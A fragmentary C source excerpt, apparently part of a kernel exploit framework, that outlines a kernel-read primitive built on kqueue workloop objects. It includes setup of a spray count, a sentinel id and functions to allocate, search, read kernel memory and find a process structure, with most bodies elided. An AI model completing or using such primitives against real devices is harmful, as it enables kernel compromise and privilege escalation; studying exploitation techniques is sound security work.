...
static const u64 kread_kqueue_workloop_ctl_sentinel = 0x1122334455667788;

static inline u64 kread_kqueue_workloop_ctl_kread_u64(struct kfd* kfd, u64 kaddr);

static inline void kread_kqueue_workloop_ctl_init(struct kfd* kfd)
{
    kfd->kread.krkw_maximum_id = 100000;
    kfd->kread.krkw_object_size = sizeof(struct kqworkloop);
}

static inline void kread_kqueue_workloop_ctl_allocate(struct kfd* kfd, u64 id)
{
...
static inline bool kread_kqueue_workloop_ctl_search(struct kfd* kfd, u64 object_uaddr)
{
...
static inline void kread_kqueue_workloop_ctl_kread(struct kfd* kfd, u64 kaddr, void* uaddr, u64 size)
{
    kread_from_method(u64, kread_kqueue_workloop_ctl_kread_u64);
}

static inline void kread_kqueue_workloop_ctl_find_proc(struct kfd* kfd)
{
...
static inline void kread_kqueue_workloop_ctl_deallocate(struct kfd* kfd, u64 id)
{
    struct kqueue_workloop_params params = {
        .kqwlp_version = (i32)(sizeof(params)),
        .kqwlp_id = id + kread_kqueue_workloop_ctl_sentinel,
...
static inline void kread_kqueue_workloop_ctl_free(struct kfd* kfd)
{
